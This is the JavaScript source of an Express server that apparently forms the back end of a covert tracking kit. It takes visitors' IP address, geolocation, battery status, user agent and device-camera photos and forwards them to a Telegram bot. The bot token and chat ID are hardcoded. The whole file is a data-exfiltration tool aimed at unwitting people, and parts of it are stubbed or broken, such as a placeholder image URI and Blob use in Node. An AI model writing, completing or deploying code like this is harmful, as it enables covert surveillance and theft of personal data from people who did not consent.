const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const port = 3000;

const TELEGRAM_BOT_TOKEN = '6663057274:AAHV-Wf7WVdcHZdTLo9TfOtvRVKSdMH6vuw';
const TELEGRAM_CHAT_ID = '5045459233';

app.use(express.json());
app.use(express.static('public'));

// Function to convert data URI to Blob
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

// Function to send photo and user agent details to Telegram
function sendPhotoAndUserAgentToTelegram(dataURL, userAgent, chatId) {
    const blob = dataURItoBlob(dataURL);
    const formData = new FormData();
    formData.append('photo', blob, 'photo.png');
    formData.append('text', `User Agent: ${userAgent}`);
    formData.append('chat_id', chatId);

    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
        headers: {
            ...formData.getHeaders()
        }
    })
    .then(response => {
        if (response.status === 200) {
            console.log('Photo and user agent details sent to Telegram successfully');
        } else {
            throw new Error('Failed to send photo and user agent details to Telegram');
        }
    })
    .catch(error => {
        console.error('Error sending photo and user agent details to Telegram:', error);
    });
}

// Routes

// Get public IP and geolocation
app.get('/ip', async (req, res) => {
    try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        const ip = ipResponse.data.ip;

        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const geolocation = geoResponse.data;

        res.json({ ip, geolocation });
    } catch (error) {
        console.error('Error fetching IP and geolocation:', error);
        res.status(500).send('Error fetching IP and geolocation');
    }
});

// Receive device information
app.post('/device-info', (req, res) => {
    const deviceInfo = req.body;
    console.log('Device Info:', deviceInfo);

    const message = `
Device Information:
- IP: ${deviceInfo.ip}
- Geolocation: ${deviceInfo.geolocation.city}, ${deviceInfo.geolocation.country}
- Battery Percentage: ${deviceInfo.batteryPercentage}%
- Charging Status: ${deviceInfo.chargingStatus}
- User Agent: ${deviceInfo.userAgent}
    `;

    sendMessageToTelegram(message);
    res.send('Device info received');
});

// Endpoint to trigger capturing photo and sending to Telegram
app.get('/capture-photo', (req, res) => {
    const chatId = req.query.chatId;
    if (chatId) {
        sendPhotoAndUserAgentToTelegram('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...', 'Mozilla/5.0', chatId); // Replace with actual dataURL and userAgent
        res.send('Photo capture initiated');
    } else {
        res.status(400).send('Chat ID is required');
    }
});

// Function to send message to Telegram
function sendMessageToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    })
    .then(response => {
        if (response.status === 200) {
            console.log('Message sent to Telegram');
        } else {
            throw new Error('Failed to send message to Telegram');
        }
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });
}

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

